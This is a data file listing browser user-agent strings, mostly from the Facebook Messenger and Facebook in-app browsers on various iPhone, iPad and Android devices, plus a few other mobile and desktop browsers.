Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F70 [FBAN/MessengerForiOS;FBAV/85.0.0.22.69;FBBV/37013644;FBRV/0;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/
Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/99.0.0.31.139;FBBV/45331829;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Carrier;FBID/phone;FB
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/61.0.0.29.25;FBBV/24721691;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/61.0.0.29.25;FBBV/24721691;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/Beeline;FBID/phone;FBLC/r
Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/50.0.0.15.72;FBBV/17975388;FBDV/iPad2,7;FBMD/iPad;FBSN/iPhone OS;FBSV/9.1;FBSS/1; FBCR/MobileTeleSystems;FBID/tablet;FBLC/ru_RU;
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 [FBAN/MessengerForiOS;FBAV/23.1.0.15.15;FBBV/8176219;FBDV/iPad4,4;FBMD/iPad;FBSN/iPhone OS;FBSV/8.2;FBSS/2; FBCR/;FBID/tablet;FBLC/ru_RU;FBOP/1]
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/MessengerForiOS;FBAV/15.0.0.15.14;FBBV/4974699;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 [FBAN/MessengerForiOS;FBAV/64.0.0.28.84;FBBV/26403168;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.1;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/
Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/221.1.0.15.157;] [ip:213.205.242.78]
Mozilla/5.0 (iPad; CPU OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/88.0.0.27.69;FBBV/38853002;FBRV/0;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBCR/;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/br_pt;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 [FBAN/MessengerForiOS;FBAV/25.0.0.4.14;FBBV/8936291;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.2;FBSS/2; FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/120.0.0.48.70;FBBV/59774553;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/3;FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/112.0.0.36.70;FBBV/54364624;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Rogers;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/123.0.0.44.69;FBBV/62323340;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/128.0.0.43.90;FBBV/66013621;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B440 [FBAN/MessengerForiOS;FBAV/34.0.0.21.276;FBBV/13810118;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.2;FBSS/2; FBCR/Globe;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/13.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/113.0.0.38.70;FBBV/54935425;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/Ooredoo;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16C101 [FBAN/MessengerForiOS;FBAV/196.0.0.54.99;FBBV/135382157;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.1.2;FBSS/3;FBCR/CELCOM;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/MessengerForiOS;FBAV/201.0.0.47.100;FBBV/141000120;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/3;FBCR/TRUE-H;FBID/phone;FBLC/th_TH;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/190.1.0.58.95;FBBV/129822925;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/MetroPCS;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/MessengerForiOS;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/pl_PL;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 [FBAN/MessengerForiOS;FBAV/200.0.0.27.103;FBBV/139866222;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.3;FBSS/2;FBCR/Telcel;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/191.0.0.54.98;FBBV/130377189;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/MetroPCS;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBAV/191.0.0.54.98;FBBV/130377189;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBCR/Free;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 [FBAN/MessengerForiOS;FBAV/201.0.0.47.100;FBBV/141000120;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]
Mozilla/5.0 (iPad; CPU OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (Linux; Android 6.0.1; P01T_1 Build/MMB29P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.81 Safari/537.36 [FB_IAB/MESSENGER;FBAV/119.0.0.18.91;]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBID/phone;FBLC/hu_HU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad5,1;FBMD/iPad;FBSN/iOS;FBSV/13.2.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23 (Edition Yx)
Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.72 Mobile Safari/537.36 OPR/55.2.2719.50740
Mozilla/5.0 (Linux; Android 10; ANG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; ZB631KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36
Mozilla/5.0 (Linux; arm_64; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.115.00 SA/3 Mobile Safari/537.36
Mozilla/5.0 (Linux; arm_64; Android 10; MI 8 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.114.1 YaSearchBrowser/21.114.1 BroPP/1.0 SA/3 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; SM-A205FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/347.0.0.28.237;]
Mozilla/5.0 (Linux; Android 10; POT-LX1 Build/HUAWEIPOT-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/290.0.0.44.121;]
Mozilla/5.0 (Linux; Android 9; GS290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36
Mozilla/5.0 (Linux; arm; Android 10; COL-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.101 YaBrowser/21.8.1.138.00 SA/3 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Home Assistant/2023.2 (io.robbie.HomeAssistant; build:2023.444; iPadOS 16.4.0) Mobile/HomeAssistant, like Safari
Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/110.0.5481.114 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15 [ip:90.231.5.114]
Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPad12,1;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G71 [FBAN/FBIOS;FBDV/iPad11,7;FBMD/iPad;FBSN/iPadOS;FBSV/15.6;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPad8,9;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBID/tablet;FBLC/nl_NL;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/398.0.0.27.69;FBBV/450825020;FBDV/iPad7,6;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en-GB;FBOP/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/2;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/404.0.0.32.69;FBBV/451012827;FBDV/iPhone15,2;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/452362176]
Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) WebKit/8614 (KHTML, like Gecko) Mobile/20B101 [FBAN/FBIOS;FBAV/329.0.0.45.119;FBBV/307086707;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/309406790]
Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D47 [FBAN/FBIOS;FBAV/404.0.0.32.69;FBBV/451012827;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0]
Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-A107M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; M2007J20CG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A705FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; M2007J17G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 6.0.1; D6543 Build/23.5.A.1.291; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; SM-J730G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; moto g(7) play Build/QPYS30.52-22-14; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-A315G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A115M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A037M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 9; SM-J415G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 8.0.0; moto e5 play Build/ODP27.91-167-9-19; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; SM-A032M Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-J600GT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; SM-A115M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; moto g(100) Build/S1RTS32.41-20-16-1-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; ACK2326 Build/Kirk2_v1.1.8_BTM-ST; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 10; moto g(7) Build/QPUS30.52-16-2-13; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]
Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
